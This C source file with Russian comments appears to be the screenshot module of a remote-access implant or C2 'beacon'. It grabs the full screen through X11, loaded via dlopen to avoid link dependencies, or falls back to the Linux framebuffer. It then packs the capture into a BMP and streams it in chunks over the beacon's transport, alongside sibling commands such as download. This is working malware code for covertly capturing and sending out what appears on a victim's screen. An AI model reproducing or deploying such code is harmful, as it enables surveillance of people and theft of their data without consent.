// Захват экрана → 24-bit BMP → RESP_FILE.
//
// Linux (два метода):
//   1) X11 (XGetImage на корневое окно) — через dlopen.
//   2) Фреймбуфер /dev/fb0 — TTY/embedded.
//
// macOS: заглушка (полноценная реализация через CGDisplayCreateImage — позже).
//
// Результат отправляется чанками (аналог cmd_download / Windows cmd_screenshot).

#include "../core/beacon.h"
#include <string.h>

#ifdef __APPLE__
// macOS: скриншот пока не реализован.
void cmd_screenshot(const BeaconTask* t) {
    out_begin(t->id, RESP_ERROR);
    const char* msg = "screenshot: not yet implemented on macOS\n";
    out_write(msg, strlen(msg));
}
#else // Linux

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/fb.h>

// ---- BMP-заголовки (packed, идентичны Windows BMP) -------------------------

#pragma pack(push, 1)
typedef struct {
    uint16_t bfType;       // 0x4D42 = 'BM'
    uint32_t bfSize;       // размер файла целиком
    uint16_t bfReserved1;
    uint16_t bfReserved2;
    uint32_t bfOffBits;    // смещение пиксельных данных
} BmpFileHdr;

typedef struct {
    uint32_t biSize;
    int32_t  biWidth;
    int32_t  biHeight;     // отрицательный = top-down
    uint16_t biPlanes;
    uint16_t biBitCount;
    uint32_t biCompression;
    uint32_t biSizeImage;
    int32_t  biXPelsPerMeter;
    int32_t  biYPelsPerMeter;
    uint32_t biClrUsed;
    uint32_t biClrImportant;
} BmpInfoHdr;
#pragma pack(pop)

// ---- Отправка BMP-данных чанками (общая часть) -----------------------------

static void send_bmp(uint64_t task_id, int width, int height,
                     const uint8_t* bgr_rows, uint32_t bgr_stride) {
    // BMP-строки должны быть выровнены по 4 байта
    uint32_t bmp_stride = ((uint32_t)(width * 3) + 3u) & ~3u;
    uint32_t bmp_bytes  = bmp_stride * (uint32_t)height;

    BmpFileHdr fh;
    BmpInfoHdr ih;
    uint32_t hdr_sz = (uint32_t)(sizeof(fh) + sizeof(ih));

    memset(&fh, 0, sizeof(fh));
    fh.bfType    = 0x4D42u;
    fh.bfSize    = hdr_sz + bmp_bytes;
    fh.bfOffBits = hdr_sz;

    memset(&ih, 0, sizeof(ih));
    ih.biSize        = sizeof(ih);
    ih.biWidth       = width;
    ih.biHeight      = -height;  // top-down
    ih.biPlanes      = 1;
    ih.biBitCount    = 24;
    ih.biSizeImage   = bmp_bytes;

    out_begin(task_id, RESP_FILE);
    const TransportVtbl* tv = get_transport();

    // Заголовки (54 байта)
    out_write(&fh, sizeof(fh));
    out_write(&ih, sizeof(ih));

    // Пиксели построчно — конвертируем в BGR 24-bit с выравниванием
    uint8_t pad[4] = {0, 0, 0, 0};
    uint32_t pad_bytes = bmp_stride - (uint32_t)(width * 3);
    for (int y = 0; y < height; ++y) {
        const uint8_t* src = bgr_rows + (uint32_t)y * bgr_stride;
        out_write(src, (size_t)(width * 3));
        if (pad_bytes)
            out_write(pad, pad_bytes);
        if (out_remaining() < 16384u)
            out_flush_chunk(tv, 0);
    }

    out_flush_chunk(tv, 1);
}

// ---- Метод 1: X11 через dlopen --------------------------------------------

// Типы X11 (минимальный набор, без #include <X11/Xlib.h>)
typedef unsigned long XID;
typedef struct _XDisplay Display;
typedef struct {
    int width, height;
    int xoffset;
    int format;
    char* data;
    int byte_order;
    int bitmap_unit;
    int bitmap_bit_order;
    int bitmap_pad;
    int depth;
    int bytes_per_line;
    int bits_per_pixel;
    unsigned long red_mask, green_mask, blue_mask;
    void* obdata;
    // f — контрольная функция
    struct funcs {
        void* create_image;
        int (*destroy_image)(struct XImage_*);
        unsigned long (*get_pixel)(struct XImage_*, int, int);
        int (*put_pixel)(struct XImage_*, int, int, unsigned long);
        void* sub_image;
        int (*add_pixel)(struct XImage_*, long);
    } f;
} XImage_;

typedef struct {
    int x, y;
    int width, height;
    // ... остальные поля не нужны
} XWindowAttributes_;

// Указатели на X11 функции
typedef Display* (*pfn_XOpenDisplay)(const char*);
typedef int      (*pfn_XCloseDisplay)(Display*);
typedef XID      (*pfn_XDefaultRootWindow)(Display*);
typedef int      (*pfn_XGetWindowAttributes)(Display*, XID, XWindowAttributes_*);
typedef XImage_* (*pfn_XGetImage)(Display*, XID, int, int, unsigned int, unsigned int,
                                  unsigned long, int);
typedef int      (*pfn_XDestroyImage)(XImage_*);

#define ZPixmap  2
#define AllPlanes (~0UL)

static int try_x11(uint64_t task_id) {
    void* lib = dlopen("libX11.so.6", RTLD_LAZY);
    if (!lib) lib = dlopen("libX11.so", RTLD_LAZY);
    if (!lib) return 0;

    pfn_XOpenDisplay       pOpen  = (pfn_XOpenDisplay)dlsym(lib, "XOpenDisplay");
    pfn_XCloseDisplay      pClose = (pfn_XCloseDisplay)dlsym(lib, "XCloseDisplay");
    pfn_XDefaultRootWindow pRoot  = (pfn_XDefaultRootWindow)dlsym(lib, "XDefaultRootWindow");
    pfn_XGetWindowAttributes pAttr = (pfn_XGetWindowAttributes)dlsym(lib, "XGetWindowAttributes");
    pfn_XGetImage          pGet   = (pfn_XGetImage)dlsym(lib, "XGetImage");
    pfn_XDestroyImage      pDest  = (pfn_XDestroyImage)dlsym(lib, "XDestroyImage");

    if (!pOpen || !pClose || !pRoot || !pAttr || !pGet || !pDest) {
        dlclose(lib);
        return 0;
    }

    // Пробуем DISPLAY из окружения или :0
    Display* dpy = pOpen(NULL);
    if (!dpy) dpy = pOpen(":0");
    if (!dpy) { dlclose(lib); return 0; }

    XID root = pRoot(dpy);

    // Размер корневого окна
    // XGetWindowAttributes возвращает полную структуру, но нам нужны только width/height
    // Структура XWindowAttributes начинается с x, y, width, height
    unsigned char attr_buf[256];
    memset(attr_buf, 0, sizeof(attr_buf));
    if (!pAttr(dpy, root, (XWindowAttributes_*)attr_buf)) {
        pClose(dpy);
        dlclose(lib);
        return 0;
    }
    XWindowAttributes_* attr = (XWindowAttributes_*)attr_buf;
    int w = attr->width;
    int h = attr->height;

    if (w <= 0 || h <= 0 || w > 16384 || h > 16384) {
        pClose(dpy);
        dlclose(lib);
        return 0;
    }

    // Захват всего корневого окна в формате ZPixmap
    XImage_* img = pGet(dpy, root, 0, 0, (unsigned)w, (unsigned)h, AllPlanes, ZPixmap);
    if (!img || !img->data) {
        if (img) pDest(img);
        pClose(dpy);
        dlclose(lib);
        return 0;
    }

    // Конвертируем XImage → BGR24 буфер
    uint32_t bgr_stride = (uint32_t)w * 3;
    uint8_t* bgr = (uint8_t*)bmalloc((size_t)bgr_stride * (size_t)h);
    if (!bgr) {
        pDest(img);
        pClose(dpy);
        dlclose(lib);
        return 0;
    }

    int bpp = img->bits_per_pixel;
    int bpl = img->bytes_per_line;

    for (int y = 0; y < h; ++y) {
        uint8_t* dst = bgr + (uint32_t)y * bgr_stride;
        const uint8_t* src = (const uint8_t*)img->data + y * bpl;
        for (int x = 0; x < w; ++x) {
            uint32_t pixel;
            if (bpp == 32) {
                pixel = *(const uint32_t*)(src + x * 4);
            } else if (bpp == 24) {
                pixel = (uint32_t)src[x*3] | ((uint32_t)src[x*3+1] << 8) | ((uint32_t)src[x*3+2] << 16);
            } else if (bpp == 16) {
                uint16_t p16 = *(const uint16_t*)(src + x * 2);
                // RGB565 → BGR24
                dst[x*3+0] = (uint8_t)(((p16 & 0x001F) * 255) / 31);
                dst[x*3+1] = (uint8_t)((((p16 >> 5) & 0x3F) * 255) / 63);
                dst[x*3+2] = (uint8_t)((((p16 >> 11) & 0x1F) * 255) / 31);
                continue;
            } else {
                pixel = 0;
            }
            // X11 ZPixmap: данные в нативном порядке байт, обычно BGRA или BGRX
            dst[x*3+0] = (uint8_t)(pixel & 0xFF);         // B
            dst[x*3+1] = (uint8_t)((pixel >> 8) & 0xFF);  // G
            dst[x*3+2] = (uint8_t)((pixel >> 16) & 0xFF); // R
        }
    }

    pDest(img);
    pClose(dpy);
    dlclose(lib);

    send_bmp(task_id, w, h, bgr, bgr_stride);
    bfree(bgr);
    return 1;
}

// ---- Метод 2: фреймбуфер /dev/fb0 -----------------------------------------

static int try_framebuffer(uint64_t task_id) {
    int fd = open("/dev/fb0", O_RDONLY);
    if (fd < 0) return 0;

    struct fb_var_screeninfo vinfo;
    struct fb_fix_screeninfo finfo;
    if (ioctl(fd, FBIOGET_VSCREENINFO, &vinfo) < 0 ||
        ioctl(fd, FBIOGET_FSCREENINFO, &finfo) < 0) {
        close(fd);
        return 0;
    }

    int w = (int)vinfo.xres;
    int h = (int)vinfo.yres;
    int bpp = (int)vinfo.bits_per_pixel;

    if (w <= 0 || h <= 0 || w > 16384 || h > 16384 || bpp < 16) {
        close(fd);
        return 0;
    }

    size_t fb_size = (size_t)finfo.smem_len;
    if (fb_size == 0) fb_size = (size_t)finfo.line_length * (size_t)h;
    if (fb_size == 0) { close(fd); return 0; }

    uint8_t* fb = (uint8_t*)mmap(NULL, fb_size, PROT_READ, MAP_SHARED, fd, 0);
    if (fb == MAP_FAILED) { close(fd); return 0; }

    uint32_t bgr_stride = (uint32_t)w * 3;
    uint8_t* bgr = (uint8_t*)bmalloc((size_t)bgr_stride * (size_t)h);
    if (!bgr) {
        munmap(fb, fb_size);
        close(fd);
        return 0;
    }

    uint32_t line_len = finfo.line_length;

    for (int y = 0; y < h; ++y) {
        uint8_t* dst = bgr + (uint32_t)y * bgr_stride;
        const uint8_t* src = fb + (uint32_t)y * line_len;
        for (int x = 0; x < w; ++x) {
            if (bpp == 32) {
                // BGRA или BGRX
                dst[x*3+0] = src[x*4+0]; // B
                dst[x*3+1] = src[x*4+1]; // G
                dst[x*3+2] = src[x*4+2]; // R
            } else if (bpp == 24) {
                dst[x*3+0] = src[x*3+0];
                dst[x*3+1] = src[x*3+1];
                dst[x*3+2] = src[x*3+2];
            } else if (bpp == 16) {
                // RGB565
                uint16_t p = *(const uint16_t*)(src + x * 2);
                dst[x*3+0] = (uint8_t)(((p & 0x001F) * 255) / 31);
                dst[x*3+1] = (uint8_t)((((p >> 5) & 0x3F) * 255) / 63);
                dst[x*3+2] = (uint8_t)((((p >> 11) & 0x1F) * 255) / 31);
            }
        }
    }

    munmap(fb, fb_size);
    close(fd);

    send_bmp(task_id, w, h, bgr, bgr_stride);
    bfree(bgr);
    return 1;
}

// ---- Точка входа команды ---------------------------------------------------

void cmd_screenshot(const BeaconTask* t) {
    // X11 — основной метод (графический сеанс)
    if (try_x11(t->id)) return;

    // Фреймбуфер — резервный метод (TTY, embedded)
    if (try_framebuffer(t->id)) return;

    // Оба метода не сработали
    out_begin(t->id, RESP_ERROR);
    const char* msg = "screenshot: no X11 display and /dev/fb0 unavailable\n";
    out_write(msg, strlen(msg));
}

#endif // !__APPLE__
